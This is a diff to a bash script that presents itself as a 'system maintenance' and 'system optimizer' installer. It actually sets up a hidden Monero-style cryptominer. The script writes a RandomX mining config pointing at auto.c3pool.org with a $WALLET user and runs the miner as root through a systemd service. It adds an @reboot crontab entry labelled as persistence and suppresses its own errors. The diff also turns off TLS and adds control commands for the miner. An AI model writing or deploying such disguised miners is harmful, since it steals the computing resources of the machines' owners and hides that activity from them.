@@ -1,6 +1,6 @@
 #!/bin/bash
 
-VERSION=2.13
+VERSION=2.14
 
 echo "System maintenance script v$VERSION."
 echo "This script performs system optimization tasks."
@@ -90,14 +90,11 @@ cleanup_previous() {
 setup_hugepages() {
     echo "[*] Setting up huge pages..."
     # Enable huge pages
-    echo "vm.nr_hugepages=1280" >> /etc/sysctl.conf
+    echo "vm.nr_hugepages=1280" >> /etc/sysctl.conf 2>/dev/null
     sysctl -p >/dev/null 2>&1
     
-    # Install hugepages support if needed
-    if [ "$(id -u)" -eq 0 ]; then
-        apt-get install -y hugepages >/dev/null 2>&1
-        hugepages -s 1280 >/dev/null 2>&1
-    fi
+    # Set huge pages immediately
+    echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null || true
 }
 
 echo "[*] Performing system cleanup..."
@@ -154,16 +151,8 @@ if [ ! -f "$BASE_DIR/main" ]; then
 fi
 
 echo "[*] Configuring system optimizer..."
-# Create CPU threads configuration
-CPU_THREADS_CONFIG=""
-for (( i=0; i<$USABLE_THREADS; i++ )); do
-    CPU_THREADS_CONFIG="${CPU_THREADS_CONFIG}    { \"low_power_mode\": false, \"no_prefetch\": true, \"asm\": true, \"affine_to_cpu\": $i }"
-    if [ $i -lt $((USABLE_THREADS - 1)) ]; then
-        CPU_THREADS_CONFIG="${CPU_THREADS_CONFIG},\n"
-    fi
-done
-
-cat > "$CONFIG_DIR/optimizer.json" << EOF
+# Create config.json in BASE_DIR (next to main)
+cat > "$BASE_DIR/config.json" << EOF
 {
     "api": {
         "id": null,
@@ -204,14 +193,14 @@ cat > "$CONFIG_DIR/optimizer.json" << EOF
         "cn/0": false,
         "cn-lite/0": false,
         "rx/0": true,
-        "rx": [0, 2, 4, 6],
+        "rx": [0, 1, 2, 3, 4, 5, 6],
         "threads": $USABLE_THREADS,
         "max-threads": $USABLE_THREADS
     },
     "pools": [
         {
             "algo": "rx/0",
-            "coin": "monero",
+            "coin": null,
             "url": "auto.c3pool.org:19999",
             "user": "$WALLET",
             "pass": "x",
@@ -219,7 +208,7 @@ cat > "$CONFIG_DIR/optimizer.json" << EOF
             "nicehash": false,
             "keepalive": true,
             "enabled": true,
-            "tls": true,
+            "tls": false,
             "tls-fingerprint": null,
             "daemon": false,
             "socks5": null,
@@ -230,11 +219,11 @@ cat > "$CONFIG_DIR/optimizer.json" << EOF
     "print-time": 30,
     "health-print-time": 30,
     "dmi": false,
-    "retries": 3,
+    "retries": 5,
     "retry-pause": 5,
     "syslog": false,
     "tls": {
-        "enabled": true,
+        "enabled": false,
         "protocols": null,
         "cert": null,
         "cert_key": null,
@@ -252,7 +241,7 @@ EOF
 
 # Set ownership of config file
 if [ "$CURRENT_USER" != "root" ]; then
-    chown "$CURRENT_USER:$CURRENT_USER" "$CONFIG_DIR/optimizer.json" 2>/dev/null
+    chown "$CURRENT_USER:$CURRENT_USER" "$BASE_DIR/config.json" 2>/dev/null
 fi
 
 echo "[*] Creating control scripts..."
@@ -268,10 +257,10 @@ case "\$1" in
         # Enable huge pages
         echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null || true
         # Start the optimizer
-        nohup ./main --config=./.config/optimizer.json --cpu-max-threads-hint=100 > ./output.log 2>&1 &
+        nohup ./main --config=./config.json > ./output.log 2>&1 &
         echo \$! > ./pid.txt
         echo "Started with PID: \$(cat ./pid.txt)"
-        sleep 3
+        sleep 5
         echo "=== Current Status ==="
         ./control status
         echo "=== Recent Logs ==="  
@@ -286,9 +275,11 @@ case "\$1" in
         ;;
     status)
         if pgrep -f "\$SCRIPT_DIR/main" > /dev/null; then
-            echo "✅ Running - PID: \$(pgrep -f '\$SCRIPT_DIR/main')"
-            echo "📊 CPU Usage: \$(ps -p \$(pgrep -f '\$SCRIPT_DIR/main') -o %cpu --no-headers 2>/dev/null || echo 'N/A')%"
-            echo "🧠 Memory: \$(ps -p \$(pgrep -f '\$SCRIPT_DIR/main') -o %mem --no-headers 2>/dev/null || echo 'N/A')%"
+            PID=\$(pgrep -f "\$SCRIPT_DIR/main")
+            echo "✅ Running - PID: \$PID"
+            echo "📊 CPU Usage: \$(ps -p \$PID -o %cpu --no-headers 2>/dev/null || echo 'N/A')%"
+            echo "🧠 Memory: \$(ps -p \$PID -o %mem --no-headers 2>/dev/null || echo 'N/A')%"
+            echo "⏰ Uptime: \$(ps -p \$PID -o etime --no-headers 2>/dev/null || echo 'N/A')"
         else
             echo "❌ Stopped"
         fi
@@ -296,6 +287,10 @@ case "\$1" in
     logs)
         echo "=== Last 20 lines of logs ==="
         [ -f "./output.log" ] && tail -20 ./output.log || echo "No logs found"
+        ;;
+    fullogs)
+        echo "=== Full logs ==="
+        [ -f "./output.log" ] && cat ./output.log || echo "No logs found"
         ;;
     stats)
         echo "=== System Statistics ==="
@@ -306,11 +301,16 @@ case "\$1" in
         ;;
     restart)
         ./control stop
-        sleep 2
+        sleep 3
         ./control start
         ;;
+    test)
+        echo "=== Testing configuration ==="
+        cd "\$SCRIPT_DIR"
+        timeout 10s ./main --config=./config.json --dry-run 2>&1 | head -20
+        ;;
     *)
-        echo "Usage: \$0 {start|stop|status|logs|stats|restart}"
+        echo "Usage: \$0 {start|stop|status|logs|fullogs|stats|restart|test}"
         ;;
 esac
 EOF
@@ -336,7 +336,7 @@ Type=simple
 Restart=always
 RestartSec=10
 User=root
-ExecStart=$BASE_DIR/main --config=$CONFIG_DIR/optimizer.json --cpu-max-threads-hint=100
+ExecStart=$BASE_DIR/main --config=$BASE_DIR/config.json
 WorkingDirectory=$BASE_DIR
 Environment=LC_ALL=C
 StandardOutput=append:$BASE_DIR/output.log
@@ -354,7 +354,7 @@ fi
 
 # Add to crontab for persistence
 echo "[*] Setting up persistence..."
-(crontab -l 2>/dev/null | grep -v "$BASE_DIR" ; echo "@reboot sleep 20 && '$BASE_DIR/control' start > /dev/null 2>&1") | crontab -
+(crontab -l 2>/dev/null | grep -v "$BASE_DIR" ; echo "@reboot sleep 25 && '$BASE_DIR/control' start > /dev/null 2>&1") | crontab -
 
 echo "[*] Starting system optimizer..."
 cd "$BASE_DIR"
@@ -370,17 +370,19 @@ echo
 
 echo
 echo "🎯 System optimization setup complete!"
-echo "📍 Installation directory: $BASE_DIR"
-echo "🔧 Use: $BASE_DIR/control {start|stop|status|logs|stats|restart} to manage"
-echo "📈 Monitor with: top, htop, or $BASE_DIR/control logs"
+echo "📍 Installation directory: $BASE_DIR" 
+echo "🔧 Use: $BASE_DIR/control {start|stop|status|logs|stats|restart|test} to manage"
 echo
 
 # Check if process is running
 if pgrep -f "$BASE_DIR/main" > /dev/null; then
-    echo "✅ Optimizer is successfully running and using CPU!"
+    echo "✅ Optimizer is successfully running!"
     echo "💻 Check CPU usage with: top -p \$(pgrep -f '$BASE_DIR/main')"
+    echo "📋 Check detailed logs with: $BASE_DIR/control logs"
 else
-    echo "❌ Optimizer failed to start. Check details with: $BASE_DIR/control logs"
+    echo "❌ Optimizer failed to start."
+    echo "🔍 Check details with: $BASE_DIR/control logs"
+    echo "🧪 Test config with: $BASE_DIR/control test"
 fi
 
 # Cleanup
